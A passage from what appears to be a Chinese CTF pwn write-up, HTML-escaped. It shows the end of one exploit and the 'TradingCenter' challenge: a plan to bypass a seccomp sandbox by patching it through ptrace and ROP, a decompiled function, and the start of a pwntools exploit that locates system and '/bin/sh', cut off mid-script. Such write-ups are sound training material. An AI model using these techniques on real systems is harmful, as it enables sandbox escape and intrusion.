class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;scm(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;exit()&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sla(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;Do you want to exit? (y or n)&amp;#x27;&lt;/span&gt;, fake_io)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lg(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ptr&amp;#x27;&lt;/span&gt;, ptr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lg(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ld_base&amp;#x27;&lt;/span&gt;, ld_base)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lg(&lt;span class=&#34;string&#34;&gt;&amp;#x27;libc_base&amp;#x27;&lt;/span&gt;, libc_base)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#debug()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;inter()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;TradingCenter&#34;&gt;&lt;a href=&#34;#TradingCenter&#34; class=&#34;headerlink&#34; title=&#34;TradingCenter&#34;&gt;&lt;/a&gt;TradingCenter&lt;/h2&gt;&lt;p&gt;ptrace 绕沙箱，但是 ROP，折磨&lt;/p&gt;
&lt;p&gt;本地复现时候，为了简单一些，我把 3 功能打开文件输出 pid 的功能修改成了直接输出 getpid 函数的结果&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;unsigned __int64 File_Manager()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  signed __int64 v0; // rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  signed __int64 v2; // [rsp-8h] [rbp-128h] BYREF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  unsigned __int64 v3; // [rsp+118h] [rbp-8h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3 = __readfsqword(0x28u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v2 = sys_getpid();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v0 = sys_write(1u, (const char *)&amp;amp;v2, 4uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  save_money();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File_Manager_flag = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; v3 - __readfsqword(0x28u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;解题思路是通过 ptrace 修改 沙箱函数中的 push rbp; 为 ret，这样就不会执行沙箱函数了&lt;/p&gt;
&lt;p&gt;exp.py&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;165&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; struct &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; pack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; ctypes &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; base64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; subprocess &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#from LibcSearcher import *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; struct &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; pack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; tty&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;debug&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;c = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(c):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        gdb.attach(p, c)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        gdb.attach(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;get_sb&lt;/span&gt;() : &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; libc_base + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;], libc_base + &lt;span class=&#34;built_in&#34;&gt;next&lt;/span&gt;(libc.search(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#-----------------------------------------------------------------------------------------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; data : p.send(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sa  = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; text,data  :p.sendafter(text, data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl  = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; data   :p.sendline(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sla = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; text,data  :p.sendlineafter(text, data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r   = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; num=&lt;span class=&#34;number&#34;&gt;4096&lt;/span&gt;   :p.recv(num)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rl  = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; text   :p.recvuntil(text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pr = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; num=&lt;span class=&#34;number&#34;&gt;4096&lt;/span&gt; :&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(p.recv(num))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;inter   = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;        :p.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;l32 = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;    :u32(p.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\xf7&amp;#x27;&lt;/span&gt;)[-&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:].ljust(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;l64 = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;    :u64(p.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x7f&amp;#x27;&lt;/span&gt;)[-&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;:].ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uu32    = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;    :u32(p.recv(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uu64    = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;    :u64(p.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int16   = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; data   :&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(data,&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lg= &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; s, num   :p.success(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%s -&amp;gt; 0x%x&amp;#x27;&lt;/span&gt; % (s, num))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#-----------------------------------------------------------------------------------------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(os=&lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;, arch=&lt;span class=&#34;string&#34;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;, log_level=&lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#p = remote(&amp;#x27;47.238.36.100&amp;#x27;, 9999)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf_patch = &lt;span class=&#34;string&#34;&gt;&amp;#x27;./pwn&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = process(elf_patch)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(elf_patch)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./lib/libc.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ld = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./lib/ld-linux-x86-64.so.2&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#p = process([&amp;#x27;seccomp-tools&amp;#x27;, &amp;#x27;dump&amp;#x27;, &amp;#x27;./pwn&amp;#x27;])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#p = process([&amp;#x27;strace&amp;#x27;, &amp;#x27;-o&amp;#x27;, &amp;#x27;output.txt&amp;#x27;, &amp;#x27;./pwn&amp;#x27;])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;game&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;value&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sla(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;Exit&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sla(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;heart(0-3):\xf0\x9f\x99\x82\n&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(value))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#sla(b&amp;#x27;token: &amp;#x27;, b&amp;#x27;258:YuH72RYiBbRfazgdyG864ZTFGgZ7NlCoZUu1AfR+ltAOr0k0T0E8R76PjvfYV5FPNWZkPh/ZU5dkYLaiZL7ECg==&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 